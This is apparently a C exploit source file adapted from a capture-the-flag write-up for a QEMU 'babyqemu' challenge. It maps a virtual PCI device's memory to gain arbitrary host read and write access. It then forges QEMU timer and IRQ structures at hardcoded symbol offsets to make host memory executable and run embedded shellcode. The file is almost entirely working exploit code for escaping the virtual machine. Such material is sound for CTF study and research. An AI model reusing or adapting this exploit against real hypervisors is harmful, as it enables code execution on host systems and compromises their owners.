// Based on https://dangokyo.me/2018/03/25/hitb-xctf-2017-babyqemu-write-up/
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>

#define SYM_qemu_clocks 0x16af020
#define SYM_qemu_timer_notify_cb 0x43e310
#define SYM_main_loop_tlg 0x16af000
#define SYM_qemu_set_irq 0x57f690
#define SYM_qemu_mprotect_rwx 0x762500

extern char _binary_shellcode_bin_start[];
extern char _binary_shellcode_bin_end[];

typedef struct QemuEvent {
  uint32_t value;
  uint32_t initialized;
} QemuEvent;

typedef struct QEMUTimerList {
  uint64_t clock;
  char active_timers_lock[0x30];
  uint64_t active_timers;
  struct {
    uint64_t le_next;
    uint64_t le_prev;
  };
  uint64_t notify_cb;
  uint64_t notify_opaque;
  /* lightweight method to mark the end of timerlist's running */
  QemuEvent timers_done_ev;
} QEMUTimerList;

typedef struct QEMUTimer {
    int64_t expire_time;        /* in nanoseconds */
    uint64_t timer_list;
    uint64_t cb;
    uint64_t opaque;
    uint64_t next;
    int scale;
} QEMUTimer;

struct IRQState {
    char parent_obj[0x28];
    uint64_t handler;
    uint64_t opaque;
    uint32_t n;
};

#define PROT_READ 0x1
#define PROT_WRITE 0x2
#define PROT_EXEC 0x4

#define REGION_SIZE 0x1000000

unsigned char* iomem;

void die(const char* msg) {
  perror(msg);
  exit(-1);
}


void stage_address(uint64_t addr) {
  // First, set the special indicator
  memset(iomem, '@', 0x6d);
  iomem[1 << 0x14] = 1;

  // Next, write the address
  memcpy(iomem + (0xe << 0x14), &addr, sizeof(addr));
}

uint64_t arbitrary_read(uint64_t addr, char *buf, size_t n) {
  assert(n < 0x10000);

  stage_address(addr);

  memcpy(buf, iomem + (0xd << 0x14), n);

  return 0;
}

uint64_t arbitrary_write(uint64_t addr, char *buf, size_t n) {
  assert(n < 0x10000);

  stage_address(addr);

  memcpy(iomem + (0xd << 0x14), buf, n);

  return 0;
}

void set_buf_rwx(uint64_t pwn_device) {
  QEMUTimerList fake_list = {0};
  QEMUTimer fake_timer = {0};
  struct IRQState irqstate = {0};
  const uint64_t fake_list_addr = pwn_device + 0xaa8 + 0x800;
  const uint64_t fake_timer_addr = pwn_device + 0xaa8 + 0x800 + 0x58*2+ 0x18;
  const uint64_t irqstate_addr = pwn_device + 0xaa8 + 0x800 + 0x58*3 + 0x18;

  fake_list.clock = SYM_qemu_clocks;
  fake_list.active_timers_lock[0x28] = 1;
  fake_list.active_timers = fake_timer_addr;
  fake_list.le_next = 0;
  fake_list.le_prev = 0;
  fake_list.notify_cb = SYM_qemu_timer_notify_cb;
  fake_list.notify_opaque = 0;
  fake_list.timers_done_ev.value = 0;
  fake_list.timers_done_ev.initialized = 1;

  fake_timer.timer_list = fake_list_addr;
  fake_timer.cb = SYM_qemu_set_irq;
  fake_timer.opaque = irqstate_addr;
  fake_timer.scale = 1000000;
  fake_timer.expire_time = -1;

  irqstate.handler = SYM_qemu_mprotect_rwx;
  irqstate.opaque = (pwn_device + 0xaa8) & (~0xfffULL);
  printf("Doing mprotect on 0x%zx\n", irqstate.opaque);
  irqstate.n = 0x2000;

  arbitrary_write(fake_list_addr, (char*)&fake_list, sizeof(fake_list));
  arbitrary_write(fake_timer_addr, (char*)&fake_timer, sizeof(fake_timer));
  arbitrary_write(irqstate_addr, (char*)&irqstate, sizeof(irqstate));

  arbitrary_write(SYM_main_loop_tlg, (char*)&fake_list_addr, sizeof(fake_list_addr));
}

void run_shellcode(uint64_t pwn_device) {
  QEMUTimerList fake_list = {0};
  QEMUTimer fake_timer = {0};
  const uint64_t fake_list_addr = pwn_device + 0xaa8 + 0xc00;
  const uint64_t fake_timer_addr = pwn_device + 0xaa8 + 0xc00 + 0x58*2+ 0x18;
  const uint64_t shellcode_addr = pwn_device + 0xaa8;
  const size_t shellcode_sz = _binary_shellcode_bin_end - _binary_shellcode_bin_start;

  fake_list.clock = SYM_qemu_clocks;
  fake_list.active_timers_lock[0x28] = 1;
  fake_list.active_timers = fake_timer_addr;
  fake_list.le_next = 0;
  fake_list.le_prev = 0;
  fake_list.notify_cb = SYM_qemu_timer_notify_cb;
  fake_list.notify_opaque = 0;
  fake_list.timers_done_ev.value = 0;
  fake_list.timers_done_ev.initialized = 1;

  fake_timer.timer_list = fake_list_addr;
  fake_timer.cb = shellcode_addr;
  fake_timer.opaque = 0;
  fake_timer.scale = 1000000;
  fake_timer.expire_time = -1;

  arbitrary_write(fake_list_addr, (char*)&fake_list, sizeof(fake_list));
  arbitrary_write(fake_timer_addr, (char*)&fake_timer, sizeof(fake_timer));
  arbitrary_write(shellcode_addr, (char*)_binary_shellcode_bin_start, shellcode_sz);

  arbitrary_write(SYM_main_loop_tlg, (char*)&fake_list_addr, sizeof(fake_list_addr));
}


int main(int argc, char *argv[])
{
  int fd = open("/sys/devices/pci0000:00/0000:00:05.0/resource0", O_RDWR | O_SYNC);
  if (fd == -1)
    die("open");
  iomem = mmap(NULL, REGION_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (iomem == MAP_FAILED)
    die("mmap");

  printf("iomem @ %p\n", iomem);

  uint64_t device_base;
  memcpy(&device_base, iomem + (0xc << 0x14) + 0xb0, sizeof(device_base));

  printf("PWNDevice @ 0x%zx\n", device_base);

  set_buf_rwx(device_base);
  // give timer a moment to fire
  sleep(1);
  run_shellcode(device_base);

  return 0;
}
